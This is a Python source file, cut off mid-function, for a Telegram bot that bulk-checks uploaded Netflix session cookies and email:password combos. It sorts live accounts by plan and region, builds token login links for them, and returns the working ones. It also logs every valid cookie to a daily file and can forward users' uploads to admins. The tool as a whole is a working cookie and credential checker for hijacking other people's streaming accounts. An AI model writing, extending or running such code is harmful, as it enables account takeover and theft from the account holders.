import asyncio
import hashlib
import html
import logging
import os
import re
import tempfile
import threading
import zipfile
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from datetime import datetime

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove, Update, User
from premium_emoji import premium_login_keyboard_rows, pe, premium_button
from telegram.error import BadRequest, NetworkError, RetryAfter, TelegramError, TimedOut
from telegram.ext import ContextTypes

from config import (
    ADMIN_IDS,
    DAILY_COOKIES_DIR,
    MAX_ARCHIVE_ENTRY_BYTES,
    MAX_ARCHIVE_FILES,
    MAX_ARCHIVE_TOTAL_UNCOMPRESSED_BYTES,
    MAX_CONCURRENT_PROCESSING,
    MAX_UPLOAD_BYTES,
    SEND_COOKIE_TO_ADMIN,   # <-- new import
)
from db import (
    get_pending_file,
    get_pending_file_record,
    increment_file_checks,
    mark_pending_file_status,
    record_check_metric,
    remove_pending_file,
    save_user_check,
)
from netflix_client import (
    NetflixAccountInfoExtractor,
    build_nftoken_login_urls,
    convert_netscape_to_header_string,
    get_cached_result,
    get_cookie_candidates,
    set_cached_result,
    extract_nftoken_from_text,
)

logger = logging.getLogger(__name__)

ARCHIVE_TEXT_EXTENSIONS = (".txt", ".log", ".json", ".cookie", ".cookies")
COOKIE_PAIR_LINE_RE = re.compile(
    r'^(?:#HttpOnly_)?(?:NetflixId|SecureNetflixId|nfvdid|flwssn|memclid|OptanonConsent|profilesNewSession)\s*[:=]',
    re.IGNORECASE,
)

cancellation_flags: dict[int, bool] = {}
PROCESSING_SEMAPHORE = asyncio.Semaphore(MAX_CONCURRENT_PROCESSING)
FILE_PROCESSING_SEMAPHORE = asyncio.Semaphore(15)
FILE_QUEUE_LOCK = asyncio.Lock()
FILE_QUEUE: list[int] = []
ACTIVE_FILE_USERS: set[int] = set()
processing_executor = ThreadPoolExecutor(
    max_workers=MAX_CONCURRENT_PROCESSING,
    thread_name_prefix="NetflixProcessor",
)

# Daily cookie logger lock & cache for deduplication
_daily_log_lock = threading.Lock()
_daily_logged_cookies: set = set()
_daily_log_date: str = datetime.now().strftime("%Y-%m-%d")


class UploadValidationError(ValueError):
    """Raised when an uploaded file fails size/type/safety checks."""


@dataclass(frozen=True)
class PreparedUpload:
    content: str
    source_label: str


@dataclass(frozen=True)
class DedupedRecords:
    unique_records: list[str]
    total_records: int
    duplicate_records: int


def get_cancel_markup(user_id: int) -> InlineKeyboardMarkup:
    """Returns the inline cancel button using the premium ❌ emoji."""
    return InlineKeyboardMarkup([[
        premium_button("Cancel Process", callback_data=f"cancel_process_{user_id}", emoji="error", style="danger")
    ]])


def sort_account_results(results: list[str]) -> list[str]:
    """Sorts account results, prioritizing Premium/4K plans and then by Country."""
    def get_sort_key(item: str):
        plan_match = re.search(r'\|\s*Plan\s*=\s*([^|]+)', item)
        region_match = re.search(r'\|\s*Region\s*=\s*([^|]+)', item)

        plan = plan_match.group(1).strip().lower() if plan_match else ""
        region = region_match.group(1).strip().lower() if region_match else ""

        # Priority: Premium > Standard > Basic > Mobile > others
        if 'premium' in plan or '4k' in plan or 'ultra' in plan:
            plan_score = 0
        elif 'standard' in plan or '1080' in plan:
            plan_score = 1
        elif 'basic' in plan or '720' in plan:
            plan_score = 2
        elif 'mobile' in plan:
            plan_score = 3
        else:
            plan_score = 4

        return (plan_score, region)

    return sorted(results, key=get_sort_key)


def create_progress_bar(current, total, bar_length=20):
    if total == 0:
        return "#" * bar_length
    progress = current / total
    filled_length = int(bar_length * progress)
    bar = "#" * filled_length + "-" * (bar_length - filled_length)
    percentage = progress * 100
    return f"{bar} {percentage:.1f}% ({current}/{total})"


def get_active_processing_count() -> int:
    return MAX_CONCURRENT_PROCESSING - PROCESSING_SEMAPHORE._value


def get_file_queue_snapshot() -> dict[str, int]:
    return {
        "queued": len(FILE_QUEUE),
        "active": len(ACTIVE_FILE_USERS),
        "large_worker_limit": max(1, min(3, MAX_CONCURRENT_PROCESSING)),
        "cookie_workers_busy": get_active_processing_count(),
    }


def user_has_active_file_job(user_id: int) -> bool:
    return user_id in ACTIVE_FILE_USERS or user_id in FILE_QUEUE


def estimate_file_wait_seconds(record_count: int, mode: str = "quick") -> int:
    snapshot = get_file_queue_snapshot()
    per_cookie = 4 if mode == "quick" else 9
    own_processing = max(20, int(record_count * per_cookie / max(1, MAX_CONCURRENT_PROCESSING)))
    queue_delay = (snapshot["queued"] + snapshot["active"]) * 45
    return queue_delay + own_processing


def format_duration(seconds: int) -> str:
    seconds = max(0, int(seconds))
    minutes, remaining = divmod(seconds, 60)
    if minutes <= 0:
        return f"{remaining}s"
    hours, minutes = divmod(minutes, 60)
    if hours:
        return f"{hours}h {minutes}m"
    return f"{minutes}m {remaining}s"


def _record_fingerprint(record: str) -> str:
    candidates = get_cookie_candidates(record)
    source = candidates[0] if candidates else record
    return re.sub(r"\s+", " ", source.strip())


def dedupe_cookie_records(records: list[str]) -> DedupedRecords:
    seen = set()
    unique_records = []
    duplicate_count = 0
    for record in records:
        cleaned = record.strip()
        if not cleaned:
            continue
        fingerprint = _record_fingerprint(cleaned)
        if fingerprint in seen:
            duplicate_count += 1
            continue
        seen.add(fingerprint)
        unique_records.append(cleaned)
    return DedupedRecords(
        unique_records=unique_records,
        total_records=len([record for record in records if record.strip()]),
        duplicate_records=duplicate_count,
    )


def build_result_sections(active: list[str], hold: list[str], expired: list[str], title: str) -> str:
    sections = [
        f"{title}",
        f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "",
        f"Summary: Active={len(active)} | On Hold={len(hold)} | Expired/Invalid={len(expired)}",
        "",
    ]
    for section_title, rows in (
        ("ACTIVE", active),
        ("ON HOLD", hold),
        ("EXPIRED / INVALID", expired),
    ):
        sections.append(f"===== {section_title} ({len(rows)}) =====")
        if rows:
            sections.extend(rows)
        else:
            sections.append("None")
        sections.append("")
    return "\n".join(sections).strip() + "\n"


def extract_credentials_from_line(text: str) -> str | None:
    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s|;]+)', text or "")
    return match.group(1) if match else None


def merge_adjacent_credentials(records: list[str]) -> list[str]:
    merged: list[str] = []
    pending_credential: str | None = None

    for record in records:
        cleaned = record.strip()
        if not cleaned:
            continue

        credential = extract_credentials_from_line(cleaned)
        has_cookie = bool(get_cookie_candidates(cleaned))

        if has_cookie:
            if pending_credential and not credential:
                cleaned = f"{pending_credential} | {cleaned}"
            pending_credential = None
            merged.append(cleaned)
            continue

        if credential:
            if merged and not extract_credentials_from_line(merged[-1]):
                merged[-1] = f"{merged[-1]} | {credential}"
            else:
                pending_credential = credential
            continue

        merged.append(cleaned)

    return merged


def prepend_credential_if_present(line: str, account_info: str) -> str:
    account_info = account_info.replace("| Combo =", "| Credential =")
    credential = extract_credentials_from_line(line)
    if not credential or "Credential =" in account_info:
        return account_info
    return f"| Credential = {credential} {account_info}"


async def telegram_call_with_retries(call, *args, retries=3, **kwargs):
    for attempt in range(retries):
        try:
            return await call(*args, **kwargs)
        except BadRequest as exc:
            if "message is not modified" in str(exc).lower():
                return None
            raise
        except RetryAfter as exc:
            retry_after = getattr(exc, "retry_after", 1)
            if hasattr(retry_after, "total_seconds"):
                retry_after = retry_after.total_seconds()
            await asyncio.sleep(min(float(retry_after) + 0.5, 15))
        except (TimedOut, NetworkError) as exc:
            if attempt >= retries - 1:
                raise
            delay = 1.5 * (attempt + 1)
            logger.warning("Telegram timeout/network error: %s; retrying in %.1fs", exc, delay)
            await asyncio.sleep(delay)


async def send_document_from_path(bot, chat_id: int, file_path: str, *, filename: str, caption: str | None = None, parse_mode: str | None = None):
    for attempt in range(3):
        try:
            with open(file_path, 'rb') as document:
                return await bot.send_document(
                    chat_id=chat_id,
                    document=document,
                    caption=caption,
                    parse_mode=parse_mode,
                    filename=filename,
                )
        except BadRequest:
            raise
        except RetryAfter as exc:
            retry_after = getattr(exc, "retry_after", 1)
            if hasattr(retry_after, "total_seconds"):
                retry_after = retry_after.total_seconds()
            await asyncio.sleep(min(float(retry_after) + 0.5, 15))
        except (TimedOut, NetworkError) as exc:
            if attempt >= 2:
                raise
            delay = 1.5 * (attempt + 1)
            logger.warning("Telegram document send failed: %s; retrying in %.1fs", exc, delay)
            await asyncio.sleep(delay)


async def _run_cookie_worker(user_id: int, func, *args):
    """Executes a blocking function in the thread pool, safely acquiring a global worker slot."""
    if cancellation_flags.get(user_id, False):
        return None
    async with PROCESSING_SEMAPHORE:
        if cancellation_flags.get(user_id, False):
            return None
        return await asyncio.get_running_loop().run_in_executor(processing_executor, func, *args)


async def enter_file_processing_queue(user_id: int, progress_msg, label: str) -> bool:
    async with FILE_QUEUE_LOCK:
        FILE_QUEUE.append(user_id)

    last_position = None
    while True:
        if cancellation_flags.get(user_id, False):
            async with FILE_QUEUE_LOCK:
                if user_id in FILE_QUEUE:
                    FILE_QUEUE.remove(user_id)
            await telegram_call_with_retries(progress_msg.edit_text, text="❌ Processing cancelled before it started.")
            return False

        try:
            await asyncio.wait_for(FILE_PROCESSING_SEMAPHORE.acquire(), timeout=2)
            break
        except asyncio.TimeoutError:
            async with FILE_QUEUE_LOCK:
                position = FILE_QUEUE.index(user_id) + 1 if user_id in FILE_QUEUE else 1
                active = len(ACTIVE_FILE_USERS)
            if position != last_position:
                last_position = position
                await telegram_call_with_retries(
                    progress_msg.edit_text,
                    text=f"⏳ Queued for {label}...\n\nQueue position: {position}\nActive large checks: {active}",
                    reply_markup=get_cancel_markup(user_id)
                )

    async with FILE_QUEUE_LOCK:
        if user_id in FILE_QUEUE:
            FILE_QUEUE.remove(user_id)
        ACTIVE_FILE_USERS.add(user_id)
        active = len(ACTIVE_FILE_USERS)

    await telegram_call_with_retries(
        progress_msg.edit_text,
        text=f"🚀 {label} started.\n\nActive large checks: {active}\nUse Cancel to stop after the current in-flight request finishes.",
        reply_markup=get_cancel_markup(user_id)
    )
    return True


async def leave_file_processing_queue(user_id: int) -> None:
    async with FILE_QUEUE_LOCK:
        if user_id in ACTIVE_FILE_USERS:
            ACTIVE_FILE_USERS.remove(user_id)
            FILE_PROCESSING_SEMAPHORE.release()


def build_login_keyboard(token: str | None) -> InlineKeyboardMarkup | None:
    if not token:
        return None
    urls = build_nftoken_login_urls(token)
    return InlineKeyboardMarkup(premium_login_keyboard_rows(urls))


def validate_document_size(document) -> None:
    file_size = getattr(document, "file_size", None)
    if file_size is not None and file_size > MAX_UPLOAD_BYTES:
        mb = MAX_UPLOAD_BYTES / (1024 * 1024)
        raise UploadValidationError(f"File is too large. Maximum upload size is {mb:.0f} MB.")


def _validate_archive_infos(infos) -> list:
    text_infos = []
    total_size = 0
    for info in infos:
        is_dir = info.is_dir() if hasattr(info, "is_dir") else info.isdir() if hasattr(info, "isdir") else False
        if is_dir:
            continue
        filename = getattr(info, "filename", "")
        if not filename.lower().endswith(ARCHIVE_TEXT_EXTENSIONS):
            continue
        file_size = int(getattr(info, "file_size", 0) or 0)
        if file_size > MAX_ARCHIVE_ENTRY_BYTES:
            limit_mb = MAX_ARCHIVE_ENTRY_BYTES / (1024 * 1024)
            raise UploadValidationError(f"Archive entry {filename!r} is too large. Limit: {limit_mb:.0f} MB per text file.")
        total_size += file_size
        text_infos.append(info)

    if not text_infos:
        raise UploadValidationError("Archive does not contain any .txt files.")
    if len(text_infos) > MAX_ARCHIVE_FILES:
        raise UploadValidationError(f"Archive contains too many text files. Limit: {MAX_ARCHIVE_FILES} files.")
    if total_size > MAX_ARCHIVE_TOTAL_UNCOMPRESSED_BYTES:
        limit_mb = MAX_ARCHIVE_TOTAL_UNCOMPRESSED_BYTES / (1024 * 1024)
        raise UploadValidationError(f"Archive expands to too much text. Limit: {limit_mb:.0f} MB uncompressed.")
    return text_infos


def _read_zip_text(file_path: str) -> str:
    try:
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            text_infos = _validate_archive_infos(zip_ref.infolist())
            return "\n".join(zip_ref.read(info).decode('utf-8', errors='ignore') for info in text_infos)
    except zipfile.BadZipFile as exc:
        logger.warning("Invalid ZIP file. Attempting to read upload as plain text.")
        try:
            return _read_plain_text(file_path)
        except OSError:
            raise UploadValidationError("Invalid ZIP file.") from exc


def _read_rar_text(file_path: str) -> str:
    try:
        import rarfile
    except ImportError:
        logger.warning("RAR library missing. Attempting to read upload as plain text.")
        return _read_plain_text(file_path)

    try:
        with rarfile.RarFile(file_path) as rar_ref:
            text_infos = _validate_archive_infos(rar_ref.infolist())
            return "\n".join(rar_ref.read(info.filename).decode('utf-8', errors='ignore') for info in text_infos)
    except rarfile.RarCannotExec:
        logger.warning("RAR binary missing. Attempting to read upload as plain text.")
        return _read_plain_text(file_path)
    except rarfile.Error:
        logger.warning("Invalid RAR file. Attempting to read upload as plain text.")
        return _read_plain_text(file_path)


def _read_plain_text(file_path: str) -> str:
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as handle:
        content = handle.read(MAX_UPLOAD_BYTES + 1)
    if len(content.encode('utf-8', errors='ignore')) > MAX_UPLOAD_BYTES:
        mb = MAX_UPLOAD_BYTES / (1024 * 1024)
        raise UploadValidationError(f"Text file is too large. Maximum upload size is {mb:.0f} MB.")
    return content


def _looks_like_rar(file_path: str) -> bool:
    try:
        with open(file_path, 'rb') as handle:
            return handle.read(8).startswith(b"Rar!\x1a\x07")
    except OSError:
        return False


def split_cookie_records(content: str) -> list[str]:
    """
    Split uploaded text into logical cookie records.
    Handles Windows (CRLF) and Unix (LF) line endings.
    """
    text = (content or "").strip()
    if not text:
        return []

    # Remove BOM if present
    if text.startswith('\ufeff'):
        text = text[1:]

    # Normalize line endings to '\n'
    text = text.replace('\r\n', '\n').replace('\r', '\n')

    # If it's JSON or Netscape, treat as one record (these formats are handled elsewhere)
    if text.startswith(('{', '[')):
        return [text]
    if text.startswith('# Netscape HTTP Cookie File') or ('\t' in text and '.netflix.com' in text):
        return [text]

    # If the whole text contains both NetflixId and SecureNetflixId on the same logical line
    # and there is no newline, it's a single cookie.
    if '\n' not in text:
        return [text]

    # If we have blank lines, split by them
    if '\n\n' in text:
        blocks = [block.strip() for block in text.split('\n\n') if block.strip()]
        if blocks:
            records = []
            for block in blocks:
                lines = block.splitlines()
                # If a block has multiple lines and each line seems to be a separate cookie,
                # split them individually.
                if len(lines) > 1 and all(('NetflixId=' in line or 'SecureNetflixId=' in line) for line in lines):
                    records.extend([line.strip() for line in lines if line.strip()])
                else:
                    records.append(block)
            return [r for r in records if r]

    # No blank lines – split by newline only if each line contains NetflixId/SecureNetflixId
    lines = text.splitlines()
    if len(lines) > 1 and all(('NetflixId=' in line or 'SecureNetflixId=' in line) for line in lines):
        return [line.strip() for line in lines if line.strip()]
    else:
        # Otherwise treat the whole text as one record
        return [text]


def extract_upload_text(file_path: str, file_name: str | None, mime_type: str | None) -> PreparedUpload:
    if os.path.getsize(file_path) > MAX_UPLOAD_BYTES:
        mb = MAX_UPLOAD_BYTES / (1024 * 1024)
        raise UploadValidationError(f"Downloaded file is too large. Maximum upload size is {mb:.0f} MB.")

    name = (file_name or "").lower()
    mime = (mime_type or "").lower()
    if zipfile.is_zipfile(file_path) or name.endswith('.zip') or mime in {'application/zip', 'application/x-zip-compressed'}:
        return PreparedUpload(_read_zip_text(file_path), "Archive File")
    if _looks_like_rar(file_path) or name.endswith('.rar') or mime in {'application/x-rar-compressed', 'application/rar', 'application/vnd.rar'}:
        return PreparedUpload(_read_rar_text(file_path), "Archive File")

    return PreparedUpload(_read_plain_text(file_path), "Text File")


# ---------- NEW: Send separate result files ----------
async def send_separate_result_files(bot, chat_id, working_list, hold_list, invalid_list, base_name):
    file_paths = []
    try:
        # Helper to filter empty strings and join
        def prepare_content(items):
            # Filter out empty or whitespace-only strings
            filtered = [item for item in items if item and item.strip()]
            return "\n".join(filtered), len(filtered)

        # Working
        content, count = prepare_content(working_list)
        if count > 0:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.txt', mode='w', encoding='utf-8') as f:
                f.write(content)
                f.flush()  # ensure it's written
                working_path = f.name
            # Double-check size
            if os.path.getsize(working_path) == 0:
                logger.warning(f"Working file {working_path} is empty, skipping send.")
                os.unlink(working_path)
            else:
                file_paths.append(working_path)
                await send_document_from_path(bot, chat_id, working_path,
                                              caption=f"✅ Working ({count})",
                                              filename=f"{base_name}_Working.txt")

        # On Hold (same pattern)
        content, count = prepare_content(hold_list)
        if count > 0:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.txt', mode='w', encoding='utf-8') as f:
                f.write(content)
                f.flush()
                hold_path = f.name
            if os.path.getsize(hold_path) == 0:
                logger.warning(f"Hold file {hold_path} is empty, skipping send.")
                os.unlink(hold_path)
            else:
                file_paths.append(hold_path)
                await send_document_from_path(bot, chat_id, hold_path,
                                              caption=f"⚠️ On Hold ({count})",
                                              filename=f"{base_name}_Hold.txt")

        # Invalid / Failed (same pattern)
        content, count = prepare_content(invalid_list)
        if count > 0:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.txt', mode='w', encoding='utf-8') as f:
                f.write(content)
                f.flush()
                invalid_path = f.name
            if os.path.getsize(invalid_path) == 0:
                logger.warning(f"Invalid file {invalid_path} is empty, skipping send.")
                os.unlink(invalid_path)
            else:
                file_paths.append(invalid_path)
                await send_document_from_path(bot, chat_id, invalid_path,
                                              caption=f"❌ Invalid/Expired ({count})",
                                              filename=f"{base_name}_Invalid.txt")

        return file_paths
    except Exception as e:
        logger.error(f"Error sending separate result files: {e}")
        for p in file_paths:
            if os.path.exists(p):
                try:
                    os.unlink(p)
                except OSError:
                    pass
        return []


# ---------- MODIFIED: Admin notification with toggle ----------
async def notify_admin_of_file_check(context, user, file_path, result_summary, original_filename=None, result_file_paths=None):
    """Sends admin notification – summary always, detailed files only if SEND_COOKIE_TO_ADMIN is True."""
    if user.id in ADMIN_IDS:
        return

    username = user.username or user.first_name
    safe_username = html.escape(str(username))
    admin_text = (
        f"👤 User @{safe_username} (ID: {user.id}) checked a file.\n\n"
        f"{result_summary}"
    )

    # Always send the summary text
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=admin_text, parse_mode='HTML')
        except Exception as e:
            logger.error("Failed to send file admin summary to %s: %s", admin_id, e)

    # If the flag is False, stop here – no cookie/result files sent
    if not SEND_COOKIE_TO_ADMIN:
        return

    # Otherwise, send the source file and the result files as before.
    for admin_id in ADMIN_IDS:
        try:
            if file_path and os.path.exists(file_path):
                send_name = original_filename or os.path.basename(file_path) or "User_Cookies.txt"
                await send_document_from_path(
                    context.bot,
                    admin_id,
                    file_path,
                    caption=admin_text,
                    parse_mode='HTML',
                    filename=send_name,
                )
            # Send result files if provided
            if result_file_paths:
                for rpath in result_file_paths:
                    if os.path.exists(rpath):
                        await send_document_from_path(
                            context.bot,
                            admin_id,
                            rpath,
                            caption="📊 Result file",
                            filename=os.path.basename(rpath),
                        )
        except Exception as e:
            logger.error("Failed to send detailed admin files to %s: %s", admin_id, e)


# ---------- Daily cookie logger ----------
def log_cookie_for_daily(cookie_text: str) -> None:
    """Append a single cookie string to today's daily cookie file (thread-safe, with deduplication)."""
    global _daily_log_date
    if not cookie_text:
        return
        
    cleaned = cookie_text.strip()
    cookie_hash = hashlib.md5(cleaned.encode('utf-8', errors='ignore')).hexdigest()
    today = datetime.now().strftime("%Y-%m-%d")
    
    with _daily_log_lock:
        # Reset cache on new day
        if today != _daily_log_date:
            _daily_logged_cookies.clear()
            _daily_log_date = today
            
        # Deduplication check
        if cookie_hash in _daily_logged_cookies:
            return
            
        _daily_logged_cookies.add(cookie_hash)
        
        log_file = DAILY_COOKIES_DIR / f"cookies_{today}.txt"
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(cleaned + "\n")
        except OSError as e:
            logger.error("Failed to log cookie for daily: %s", e)


async def cancel_process_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the legacy reply keyboard cancel button fallback."""
    user_id = update.effective_user.id
    if user_id in cancellation_flags:
        cancellation_flags[user_id] = True
        await telegram_call_with_retries(
            update.message.reply_text,
            text="🛑 Cancellation requested! Stopping...",
            reply_markup=ReplyKeyboardRemove(),
        )
    else:
        await telegram_call_with_retries(
            update.message.reply_text,
            text="No active process to cancel.",
            reply_markup=ReplyKeyboardRemove(),
        )


async def process_cookie_file_full_logic(file_path, user_id, progress_callback=None):
    """Process cookies from file using thread pool for concurrent execution"""
    working_results, hold_results, non_working_results = [], [], []

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = split_cookie_records(f.read())

        total_lines = len([line for line in lines if line.strip()])
        processed = 0
        start_time = time.time()
        last_update_time = time.time()
        retry_queue = []

        async def _process_batch(batch, is_retry=False):
            nonlocal processed, last_update_time
            batch_tasks = []
            for line in batch:
                line = line.strip()
                if not line:
                    continue
                batch_tasks.append(_run_cookie_worker(user_id, process_single_cookie_line_full, line, user_id))

            if not batch_tasks:
                return

            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)

            for i, result in enumerate(batch_results):
                if result is None:
                    continue
                
                is_error = isinstance(result, Exception) or (isinstance(result, tuple) and len(result) == 3 and result[2] == "Error")

                if is_error and not is_retry:
                    retry_queue.append(batch[i])
                    continue

                processed += 1
                if isinstance(result, Exception):
                    logger.error(f"Error processing cookie: {result}")
                    non_working_results.append(f"Error: {str(result)}")
                else:
                    cookie_part, account_info, account_status = result

                    if account_status == 'Active':
                        working_results.append(f"{cookie_part} {account_info}")
                    elif account_status == 'Hold':
                        hold_results.append(f"{cookie_part} {account_info}")
                    else:
                        status_emoji = "❌"
                        non_working_results.append(f"{cookie_part} {account_info} | Status = {account_status} {status_emoji}")

                if progress_callback and (time.time() - last_update_time > 2 or processed == total_lines):
                    elapsed = time.time() - start_time
                    avg_time = elapsed / processed if processed else 0
                    remaining = (total_lines - processed) * avg_time
                    eta_str = format_duration(remaining) if remaining < 3600 else f"{remaining/60:.1f}m"
                    progress_bar = create_progress_bar(processed, total_lines)
                    
                    status_label = "🔄 Retrying failed checks" if is_retry else "📊 Processing cookies"
                    msg = (
                        f"{status_label}...\n{progress_bar}\n"
                        f"ETA: {eta_str}\n\n"
                        f"✅ Active: {len(working_results)}\n"
                        f"⚠️ On Hold: {len(hold_results)}\n"
                        f"🔴 Expired/Invalid: {len(non_working_results)}\n"
                        f"🔁 To Retry: {len(retry_queue)}"
                    )
                    await progress_callback(msg, reply_markup=get_cancel_markup(user_id))
                    last_update_time = time.time()

        # Batch set to 3 per user request to limit worker usage!
        batch_size = 10
        line_batches = [lines[i:i + batch_size] for i in range(0, len(lines), batch_size)]

        for batch in line_batches:
            if cancellation_flags.get(user_id, False):
                logger.info(f"Processing cancelled by user {user_id}")
                break
            await _process_batch(batch, is_retry=False)

        if retry_queue and not cancellation_flags.get(user_id, False):
            await asyncio.sleep(2)
            retry_batches = [retry_queue[i:i + batch_size] for i in range(0, len(retry_queue), batch_size)]
            for batch in retry_batches:
                if cancellation_flags.get(user_id, False):
                    break
                await _process_batch(batch, is_retry=True)

        # Apply sorting
        sorted_working_results = sort_account_results(working_results)
        sorted_hold_results = sort_account_results(hold_results)

        if progress_callback:
            status_text = "❌ Processing cancelled" if cancellation_flags.get(user_id, False) else "✅ Processing complete!"
            progress_bar = create_progress_bar(processed, total_lines)
            await progress_callback(
                f"{status_text}\n{progress_bar}\n\n"
                f"✅ Active: {len(sorted_working_results)}\n"
                f"⚠️ On Hold: {len(sorted_hold_results)}\n"
                f"🔴 Expired/Invalid: {len(non_working_results)}",
                reply_markup=None
            )

        return sorted_working_results, sorted_hold_results, non_working_results, processed
    except (OSError, TelegramError) as e:
        logger.error(f"Error processing file: {e}")
        return [], [], [], 0


def process_single_cookie_line_full(line, user_id):
    """Process a single cookie line (runs in thread pool)"""
    try:
        extractor = NetflixAccountInfoExtractor()

        extractor.detect_email_password(line)

        candidates = get_cookie_candidates(line)

        valid_found = False
        valid_cookie_part = ""
        valid_cookie_type = ""

        if not candidates:
            record_check_metric(user_id, "unknown")
            return line, "| 🔴 Category = Expired/Invalid | Invalid Cookie Format", "Invalid"

        for cookie_part in candidates:
            cached = get_cached_result(cookie_part)
            if cached:
                record_check_metric(user_id, cached.get('status', 'unknown'))
                return cookie_part, prepend_credential_if_present(line, cached['info']), cached['status']

            cookie_type = extractor.load_cookies_from_input(cookie_part)

            if not cookie_type:
                continue

            if extractor.check_cookies_validity():
                valid_found = True
                valid_cookie_part = cookie_part
                valid_cookie_type = cookie_type
                break

        if not valid_found:
            record_check_metric(user_id, "expired")
            # FIX: Do NOT cache invalid results to avoid inconsistent hits
            return candidates[0], "| 🔴 Category = Expired/Invalid | Invalid/Expired Cookie", "Invalid"

        # Log the valid cookie for daily collection
        log_cookie_for_daily(valid_cookie_part)

        extractor.get_nftoken(valid_cookie_part)

        if extractor.get_account_info(valid_cookie_part, fetch_nftoken=False):
            base_account_info = extractor.format_account_info_for_file()
            account_info = prepend_credential_if_present(line, base_account_info)
            account_status = extractor.account_data.get('AccountStatus', 'Unknown')
            record_check_metric(user_id, account_status)

            save_user_check(user_id, f"FileCheck_{user_id}", account_info, f"File_{valid_cookie_type}")

            set_cached_result(valid_cookie_part, {'info': base_account_info, 'status': account_status})

            return valid_cookie_part, account_info, account_status
        else:
            record_check_metric(user_id, "unknown")
            return valid_cookie_part, "| 🔴 Category = Expired/Invalid | Failed to Extract Account Info", "Failed"
    except (KeyError, TypeError, ValueError) as e:
        logger.error(f"Error processing cookie line: {e}")
        record_check_metric(user_id, "unknown")
        return line, f"| ❌ Processing Error: {str(e)}", "Error"


# ---------- NEW: process cookies one by one directly without callback ----------
async def process_cookies_one_by_one_direct(update, context, file_id, user_id):
    """Processes cookies from a pending file (created from text message) one by one, without showing file options."""
    file_data = get_pending_file(file_id)
    if not file_data or file_data[0] != user_id:
        await update.message.reply_text("❌ File not found, expired, or unauthorized.")
        return

    _, file_path = file_data
    mark_pending_file_status(file_id, "processing")
    increment_file_checks(user_id)

    progress_msg = await telegram_call_with_retries(
        context.bot.send_message,
        chat_id=user_id,
        text="🔄 Preparing one-by-one check...",
    )

    non_working_results = []
    working_lines = []
    hold_lines = []
    cancellation_flags[user_id] = False
    entered_queue = False

    try:
        entered_queue = await enter_file_processing_queue(user_id, progress_msg, "one-by-one check")
        if not entered_queue:
            return

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = split_cookie_records(f.read())

        total_lines = len([line for line in lines if line.strip()])
        processed = 0
        start_time = time.time()
        last_update_time = time.time()
        retry_queue = []

        async def _process_batch(batch, is_retry=False):
            nonlocal processed, working_lines, hold_lines, last_update_time
            batch_tasks = []
            for line in batch:
                line = line.strip()
                if not line:
                    continue
                batch_tasks.append(_run_cookie_worker(user_id, process_full_cycle_for_one_by_one, line, user_id))

            if not batch_tasks:
                return

            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)

            for i, result in enumerate(batch_results):
                if result is None:
                    continue
                
                status, cookie_data, info_data = result

                if status == "Error" and not is_retry:
                    retry_queue.append(batch[i])
                    continue

                processed += 1

                if status == "Active":
                    working_lines.append(f"{cookie_data} | {info_data.get('formatted_info', '')}")
                    formatted_info = info_data.get('formatted_info', '')
                    raw_cookie = info_data.get('raw_cookie', '')
                    reply_markup = build_login_keyboard(info_data.get('nftoken'))
                    final_msg_text = f"🍪 <b>Cookie:</b>\n<code>{html.escape(raw_cookie)}</code>\n\n{formatted_info}"
                    await telegram_call_with_retries(
                        context.bot.send_message, chat_id=user_id, text=final_msg_text,
                        parse_mode='HTML', disable_web_page_preview=True, reply_markup=reply_markup,
                    )
                    await asyncio.sleep(0)
                elif status == "Hold":
                    hold_lines.append(f"{cookie_data} | {info_data.get('formatted_info', '')}")
                    formatted_info = info_data.get('formatted_info', '')
                    raw_cookie = info_data.get('raw_cookie', '')
                    reply_markup = build_login_keyboard(info_data.get('nftoken'))
                    final_msg_text = f"🍪 <b>Cookie (On Hold):</b>\n<code>{html.escape(raw_cookie)}</code>\n\n{formatted_info}"
                    await telegram_call_with_retries(
                        context.bot.send_message, chat_id=user_id, text=final_msg_text,
                        parse_mode='HTML', disable_web_page_preview=True, reply_markup=reply_markup,
                    )
                    await asyncio.sleep(0.5)
                else:
                    error_reason = info_data.get('error', 'Unknown Error')
                    non_working_results.append(f"{batch[i]} | {error_reason}")

            if time.time() - last_update_time > 2 or processed == total_lines:
                elapsed = time.time() - start_time
                avg_time = elapsed / processed if processed else 0
                remaining = (total_lines - processed) * avg_time
                eta_str = format_duration(remaining) if remaining < 3600 else f"{remaining/60:.1f}m"
                progress_bar = create_progress_bar(processed, total_lines)
                status_label = "🔄 Retrying failed checks" if is_retry else "📊 Processing cookies one-by-one"
                
                try:
                    await telegram_call_with_retries(
                        progress_msg.edit_text,
                        text=f"{status_label}...\n{progress_bar}\n"
                             f"ETA: {eta_str}\n\n"
                             f"✅ Active: {len(working_lines)}\n"
                             f"⚠️ On Hold: {len(hold_lines)}\n"
                             f"🔴 Expired/Invalid: {len(non_working_results)}\n"
                             f"🔁 To Retry: {len(retry_queue)}",
                        reply_markup=get_cancel_markup(user_id)
                    )
                except TelegramError as e:
                    logger.warning(f"Could not edit progress message: {e}")
                last_update_time = time.time()

        batch_size = 3
        line_batches = [lines[i:i + batch_size] for i in range(0, len(lines), batch_size)]

        for batch in line_batches:
            if cancellation_flags.get(user_id, False):
                logger.info(f"Processing cancelled by user {user_id}")
                break
            await _process_batch(batch, is_retry=False)
                
        if retry_queue and not cancellation_flags.get(user_id, False):
            await asyncio.sleep(0.2)
            retry_batches = [retry_queue[i:i + batch_size] for i in range(0, len(retry_queue), batch_size)]
            for batch in retry_batches:
